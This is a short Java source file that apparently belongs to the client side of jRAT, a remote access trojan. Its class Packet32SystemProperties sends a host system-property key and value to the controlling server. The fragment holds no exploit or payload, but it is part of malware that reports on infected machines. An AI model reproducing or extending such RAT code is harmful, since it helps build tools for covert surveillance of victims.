package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet32SystemProperties implements OutgoingPacket {

	private String key;
	private String property;

	public Packet32SystemProperties(String key, String property) {
		this.key = key;
		this.property = property;
	}

	@Override
	public void write(Connection con) throws Exception {
        con.writeLine(key);
        con.writeLine(property);
	}

	@Override
	public short getPacketId() {
		return 32;
	}

}
